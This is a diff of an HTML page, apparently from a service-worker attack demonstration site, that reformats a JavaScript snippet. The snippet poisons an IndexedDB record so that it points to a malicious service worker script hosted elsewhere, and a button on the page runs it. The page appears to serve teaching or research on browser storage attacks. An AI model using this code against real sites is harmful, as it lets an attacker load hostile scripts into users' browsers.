@@ -76,22 +76,22 @@
 		</ol>		
 		<p>Below is the code to poison the db URL</p>
 		<pre class="snippet-code">
-			<code class="code-example js-subscription-json language-json">
-			function modify_indexDB(){
-			      const request = indexedDB.open('demo_db', 1);
-			      request.onsuccess = (event) => {
-				     var db = event.target.result;
-				     var txn = db.transaction('urls','readwrite')
-				     txn.onsuccess =  function(ev){
-					 alert('URL Modified!!. Reload Page')
-				     }
-				     var store = txn.objectStore('urls')
-				     // delete current record in DB and insert URL of malicious script
-				     store.delete('report_url').onsuccess = ev => {
-					 var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_evil_sw.js'})
-				  }
-			      }
-			  }
+			<code class="code-example  language-js">
+function modify_indexDB(){
+      const request = indexedDB.open('demo_db', 1);
+      request.onsuccess = (event) => {
+	     var db = event.target.result;
+	     var txn = db.transaction('urls','readwrite')
+	     txn.onsuccess =  function(ev){
+		 alert('URL Modified!!. Reload Page')
+	     }
+	     var store = txn.objectStore('urls')
+	     // delete current record in DB and insert URL of malicious script
+	     store.delete('report_url').onsuccess = ev => {
+		 var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_evil_sw.js'})
+	  }
+      }
+  }
 			</code>
 		</pre>
 		<input type="button" value="Execute Malicious Script!!" onclick=modify_indexDB()>
